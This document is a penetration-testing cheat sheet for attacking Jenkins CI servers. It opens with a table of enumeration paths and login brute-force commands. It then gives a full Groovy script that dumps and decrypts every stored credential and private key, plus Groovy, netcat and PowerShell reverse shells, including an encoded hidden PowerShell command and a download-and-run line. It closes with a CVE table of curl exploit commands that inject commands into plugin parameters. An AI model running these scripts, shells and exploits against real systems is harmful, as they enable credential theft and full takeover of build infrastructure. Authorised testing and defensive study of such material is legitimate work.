# Web applications - Software - Jenkins

### Overview

`Jenkins` is a free and open source platform designed for facilitating
continuous integration and continuous delivery of software development
projects. It implements building, testing, and deploying capacities and
supports various version control (`Git`, `Apache Subversion`, `Mercurial`,
etc.) and build automation (`Apache Maven`, `Gradle`, `Apache Ant`, etc.)
utilities.  

The building and deploying tasks can be distributed on a `Jenkins Master`
server and one or multiple optional `Jenkins Slave` servers.

### Unauthenticated enumeration

The `Jenkins` web interface may be configured to allow unauthenticated users to
perform a number of actions, ranging from retrieving the `Jenkins` appliance's
configuration to executing `Groovy` script on the `Jenkins Master` and
`Jenkins Slave` servers.

Indeed, the access control of the `Jenkins` appliance
can be configured to `"Anyone can do anything"`, which grant full privileges to
unauthenticated users, or `"Legacy mode"` which gives unauthenticated users
full read access. Additionally, access to individual components can be granted
to `Anonymous Users` through the `Matrix-based security`.  

| Path | Description |
|------|-------------|
| `<URL>/systemInfo/` | Display the appliance configuration. |
| `<URL>/asynchPeople/` | Lists the local users of the appliance. <br/> Accessible to `Anonymous Users` if the authorization is set to `Legacy mode`. |
| `<URL>/view/all/builds` | List the current and past builds. <br/> Accessible to `Anonymous Users` if the authorization is set to `Legacy mode`. |
| `<URL>/view/all/newJob` | Job creation interface. |
| `<URL>/manage` | `Jenkins` management interface. |
| `<URL>/pluginManager/installed` | Lists the `Jenkins` plugins installed. |
| `<URL>/credentials/` | Default path of the `Credentials` plugin, used to manage stored credentials. <br/> Accessible to `Anonymous Users` if the authorization is set to `Legacy mode`. <br/><br/> For more information, refer to the `Build jobs secrets` section below. |
| `<URL>/script` | The `Script Console`, a `Groovy` script interpreter that can be leveraged to execute code on the `Jenkins` servers. <br/><br/> For more information, refer to the `Code execution on Jenkins servers through the Script Console` section below. |

The `metasploit`'s `auxiliary/scanner/http/jenkins_enum` module attempts, in an
unauthenticated manner, to enumerate the `Jenkins` version and to access a
number of the `URL` above.  

### Authentication brute force

Among others, `Metasploit` and `patator` can be used to brute force the
authentication of a `jenkins` instance through its web interface.

```
# JENKINS_LOGIN_URL: <URL>/j_acegi_security_check

msf > use auxiliary/scanner/http/jenkins_login

patator http_fuzz -t <50 | NUMBER_THREADS> url="<JENKINS_LOGIN_URL>" method=POST body='j_username=FILE0&j_password=FILE1' 0=<WORDLIST_USERS> 1=<WORDLIST_PASSWORDS> -x ignore:fgrep='loginError'
```

### Build jobs secrets

Various kind of secrets, such as passwords or API keys, can be stored in
`Jenkins` in order to be accessible by `Jenkins`'s `continuous delivery`
builds. As, by design, `Jenkins` must be able to provide clear text
credentials if necessary to the utilities in the pipelines, the secrets are
retrievable given sufficient privileges on the `Jenkins` appliance.

The secrets definition, management and usage are implemented through a number
of `Jenkins` plugins:
  - the `Credentials plugin`, which implements the credentials management
    interface, accessible at the `<URL>/credentials/` URL.
  - the `Credentials Binding plugin`, which allows `Jenkins` build jobs to
    inject credentials directly as environment variables.
  - the `Folders plugin`, which can be used to reduce the accessibility of
    `Credentials` to certain build jobs.

The credentials registered through the `Credentials plugin` can either be
defined with one of the following scope:
  - `System`, to be only accessible from the `Jenkins` instance itself and its'
    plugins.
  - `Global`, to be accessible to the `Jenkins` instance as well as to all
    build jobs.
  - If the `Folders plugin` is installed, locally to a `Jenkins folder` in
    order to only be accessible to the build jobs defined in the folder.

`Credentials` are stored encrypted locally on the `Jenkins` servers through
the following files:
  - `$JENKINS_HOME/credentials.xml`: file that store the encrypted
    `Credentials`.
  - `$JENKINS_HOME/secrets/hudson.util.Secret`: encrypted file that store the
    `AES-128` key used to encrypt the `Credentials` in the `credentials.xml`
    file.
  - `$JENKINS_HOME/secrets/master.key`: plain text key file that contains the
    key to decrypt the `hudson.util.Secret` file.  

###### Credentials dumping through the Script Console

The `Script Console` can be used to execute a `Groovy` script that will
retrieve and decrypt all stored `Credentials`. The permissions to access the
`Script Console` (`Overall/RunScripts`) and to retrieve `Credentials`
(`Credentials/View`) are required.

The `Groovy` script below dumps the username / password and private key
credentials from both the `System` and `Global` scopes as well as credentials
defined locally in `Jenkins folders`.

```java
import jenkins.model.*;
import com.cloudbees.hudson.plugins.folder.*;
import com.cloudbees.hudson.plugins.folder.properties.*;
import com.cloudbees.hudson.plugins.folder.properties.FolderCredentialsProvider.FolderCredentialsProperty;
import com.cloudbees.plugins.credentials.impl.*;
import com.cloudbees.plugins.credentials.*;
import com.cloudbees.plugins.credentials.domains.*;

// Retrieves the System and Global credentials.
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
  com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,
  Jenkins.instance,
  null,
  null
);

for (c in creds) {
  if (c.properties.privateKeySource) {
    println((c.properties.privateKeySource ? "ID: " + c.id + ", username: " + c.username + ", private key: " + c.getPrivateKey() : ""))
  }
}

for (c in creds) {
  if (c.properties.password) {
    println((c.properties.password ? "ID: " + c.id + ", username: " + c.username + ", password: " + c.password : ""))
  }
}

// Retrieves the credentials defined through Folders.
def allJenkinsItems = Jenkins.getInstance().getItems();
for (currentJenkinsItem in allJenkinsItems) {
  if(!(currentJenkinsItem instanceof Folder)) { continue }

  currentFolder = (Folder) currentJenkinsItem;

  println ()
  println (currentFolder.getFullName())

  def credsFolders = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,
    currentFolder,
    null,
    null
  );

  for (c in credsFolders) {
    if (c.properties.scope == CredentialsScope.GLOBAL) { continue }

    if (c.properties.privateKeySource) {
      println((c.properties.privateKeySource ? "ID: " + c.id + ", username: " + c.username + ", private key: " + c.getPrivateKey() : ""))
    }
  }

  for (c in credsFolders) {
    if (c.properties.scope == CredentialsScope.GLOBAL) { continue }

    if (c.properties.password) {
      println((c.properties.password ? "ID: " + c.id + ", username: " + c.username + ", password: " + c.password : ""))
    }
  }
}
```

###### Credentials dumping through code execution on a Jenkins server

If the `credentials.xml`, `hudson.util.Secret` and `master.key` files could be
retrieved from a `Jenkins` server, the credentials can be retrieved using the   
`jenkins_offline_decrypt` `Python` script:

```
python3 jenkins_offline_decrypt.py <MASTER_KEY_FILE> <HUDSON_UTIL_SECRET_FILE> <CREDENTIALS_XML_FILE>
```

###### Credentials leak in build jobs

Credentials and secrets may leak in build jobs console outputs and environment
variables. Note that the `Mask Passwords Plugin` plugin may be in use to redact
the secrets from the `Console Output` build log.

The `jenkins_dump_builds` Python script can be used to dump all build jobs
past builds.

```
# Source: https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py

python3 jenkins_dump_builds.py -o <OUTPUT_DIRECTORY> <JENKINS_URL | JENKINS_URL [JENKINS_URL2 ...]>

python3 jenkins_dump_builds.py -o <OUTPUT_DIRECTORY> -u "<USERNAME>" -p "<PASSWORD>" <JENKINS_URL | JENKINS_URL [JENKINS_URL2 ...]>
```

The `grep` or `ngp` utilities can then be used to search for matching keywords
in the dump build jobs console outputs and environment variables:

```
grep -rin "<password | KEYWORD>" <OUTPUT_DIRECTORY>

ngp -ri "<password | KEYWORD>" <OUTPUT_DIRECTORY>
```

### Code execution on `Jenkins` servers

###### Through the Jenkins' Script Console

The `Jenkins`'' `Script Console` can be used to execute a `Groovy` script that
will in turn execute operating system commands. Access to the `Script Console`
requires the `Overall/RunScripts` permission (which depending on the access
control of the targeted `Jenkins` appliance can be granted to unauthenticated
users).

The `Script Console`, that will execute code on the `Jenkins` `master`, is
accessible at the `<URL>/script` path. Additionally, code can be executed on
a specific `Jenkins` slaves / agents by accessing the `Script Console` through
the targeted node status page:

```
URL: <URL>/computer/(<master | NODE_NAME>)/script

Or through the interface menus: visit "Manage Jenkins" > "Manage Nodes" > Select the targeted Jenkins node -> "Script Console" (on the left panel).
```

```
# Unitary OS command execution.
def proc = "<COMMAND>".execute(); def os = new StringBuffer(); proc.waitForProcessOutput(os, System.err); println(os.toString());

# Reverse shell in Groovy.
# Source: https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
# BINARY: /bin/sh | /usr/bin/bash | cmd.exe | powershell.exe | ...
String host="<IP | HOSTNAME>";
int port=<PORT>;
String cmd="<BINARY>";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

###### Through build jobs

Operating systems commands can be executed as `steps` in `Jenkins` build jobs.
Doing so requires the `Job\Read`, `Job\Configure` and `Job\Build` permissions.

Depending on the architecture, the commands will be executed:
  - on the `Jenkins` `master` in a standalone server configuration;
  - on the `Jenkins` `slaves` / `agents` by default in a distributed builds
    environment. Indeed, in environments including `slaves` / `agents`, the
    `Jenkins` `master` node will use its resources to handle `HTTP` requests
    and the scheduling / management of build jobs while the actual execution
    of the builds will be delegated to the `slaves` / `agents` nodes.

`Jenkins` supports the execution of shell and batch commands in build jobs. The
commands specified through the web interface will be stored locally in a
temporary `bat` or `sh` script file on the node handling the build. The file
will be executed using, respectively, the following operating system commands:
`cmd /c call <TMP_FILE>` and `sh -xe <TMP_FILE>`.

The process below can be followed to configure a `step` in a `Jenkins` job and
build the job for remote code execution through a reverse shell:

```
# Configuration of the step in a given build job.
-> Main dashboard
-> <JOB> (to access the <JOB> page: <URL>/job/<JOB>/)
-> Left panel, "Configure" (to access the <JOB> configuration page: <URL>/job/<JOB>/configure)
-> Build section, "Add build step"
-> "Execute Windows batch command" / "Execute shell"

# The following reverse shells can be used to achieve remote code execution.
# For more information, refer to the "[General] Shells" note.

# Shell ("Execute shell")
# If nc's "-e" option is available on the targeted system:
nc -e /bin/sh <IP> <PORT> &
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f

# Windows PowerShell ("Execute Windows batch command")
# As PowerShell one-liners tend to induce errors if executed directly as PowerShell commands, it is recommended to either encode the command in base64 before executing it or to specify the command in a ps1 script and to download and execute it in memory through an HTTP request.
# Base64 (should be done off target)
$cmd = '$client = New-Object System.Net.Sockets.TCPClient("<IP>",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (IEX $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$EncodedCmd =[Convert]::ToBase64String($Bytes)
$EncodedCmd

powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <ENCODED_BASE64_CMD>

# HTTP
# Requires to host a webserver, which can be done using Python. Refer to the "[General] File transfer" note for more information.
# PowerShell one-liner to store in an web hosted file:
$client = New-Object System.Net.Sockets.TCPClient("<IP>",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (IEX $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell -NoP -NonI -W Hidden -Exec Bypass -c IEX (New-Object System.Net.Webclient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/<FILE_PS1>')

# Build of the updated job.
-> Job dashboard
-> Left panel, "Build" (to access the <JOB> immediate build API: <URL>/job/<JOB>/build?delay=0sec)

# If necessary, for debugging purposes, the console output of the build can be consulted.
-> Job dashboard
-> Left low panel "Build History", <BUILD>
-> Left panel, "Console Output" (to access <URL>/job/<JOB>/<BUILD_ID>/console
```

### Known critical vulnerabilities

`Jenkins`, and some of its plugins, has been vulnerable to a few published
critical security flaws, allowing for remote code execution:

| Vulnerable version | CVE number | Pre-requisite | Exploit |
|--------------------|------------|---------------|-------------|
|  <= Jenkins 1.638 | CVE-2015-8103 | Unauthenticated | Source: https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py <br/><br/> `java -jar ysoserial-master.jar CommonsCollections1 '<CMD>' > payload.out` <br/> `jenkins_rce.py <JENKINS_IP> <JENKINS_PORT> payload.out` <br/><br/> Metasploit module: `exploit/linux/misc/jenkins_java_deserialize`. |
| < Jenkins 1.650 <br/><br/> < Jenkins LTS 1.642.2 | CVE-2016-0792 | Unauthenticated |Source: https://github.com/jpiechowka/jenkins-cve-2016-0792 <br/><br/> `python3 >>> from exploit import exploit` <br/> `python3 >>> exploit(<JENKINS_URL>, <CMD>)` <br/><br/> Metasploit module: `exploit/multi/http/jenkins_xstream_deserialize`. |
| < Jenkins 2.32 <br/><br/> < Jenkins LTS 2.19.3 | CVE-2016-9299 | Unauthenticated |  Metasploit module: `exploit/multi/http/jenkins_xstream_deserialize`. |
| *If `ANONYMOUS_READ` is disabled:* <br/> < Jenkins 2.138 <br/><br/> *If `ANONYMOUS_READ` is enable or with a valid account:* <br/> Jenkins build time < 2019-01-28 | CVE-2019-1003000 <br/> CVE-2019-1003001 <br/> CVE-2019-1003002 <br/> CVE-2019-1003005 | *Depending on the targeted version:* <br/><br/> Unauthenticated <br/><br/> ANONYMOUS_READ enabled / valid user account. |  Source: https://github.com/orangetw/awesome-jenkins-rce-2019 <br/><br/> `exp.py <JENKINS_URL> <CMD>` <br/><br/> Metasploit module: `exploit/multi/http/jenkins_metaprogramming`. |
| < Pipeline Groovy Plugin 2.63 | CVE-2019-1003029 <br/> CVE-2019-1003030 | `Overall/Read` permission | Source: https://github.com/gquere/pwn_jenkins <br/><br/> Tests vulnerability by inducing a sleep: <br/> `curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){sleep(5000)}}'` <br/><br/> Command execution: <br/> `curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){"<CMD>".execute()}}'` <br/><br/> Throws an error for debugging purposes: `curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){def proc="id".execute();def os=new StringBuffer();proc.waitForProcessOutput(os, System.err);throw new Exception(os.toString())}}'` |
| < Git plugin <3.12.0 | CVE-2019-10392 | `Jobs/Configure` permission | Source: https://iwantmore.pizza/posts/cve-2019-10392.html <br/><br/> Retrives the required CSRF token: <br/> `curl '<URL>/user/test/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,":",//crumb)' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36' -H 'DNT: 1' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: <URL>' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9,it;q=0.8' -H 'Cookie: <COOKIES>' --compressed` <br/><br/> Command execution: <br/> `curl '<URL>/job/test/descriptorByName/hudson.plugins.git.UserRemoteConfig/checkUrl' -d "value=--upload-pack=`\``<CMD>`\``" -H 'Cookie: <COOKIES>' -H 'Origin: <URL>' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9,it;q=0.8' -H 'X-Prototype-Version: 1.7' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' -H 'Jenkins-Crumb: <CRUMB>' -H 'Pragma: no-cache' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36' -H 'Content-type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: text/javascript, text/html, application/xml, text/xml, */*' -H 'Cache-Control: no-cache' -H 'Referer: <URL>/job/test/configure' -H 'DNT: 1' --compressed` |
| <= ElasticBox Jenkins Kubernetes CI/CD Plugin 1.3 | CVE-2020-2211  | Must be able to "provide YAML input files to ElasticBox Jenkins Kubernetes CI/CD Plugin's build step" | Source: https://www.jenkins.io/security/advisory/2020-07-02/ |
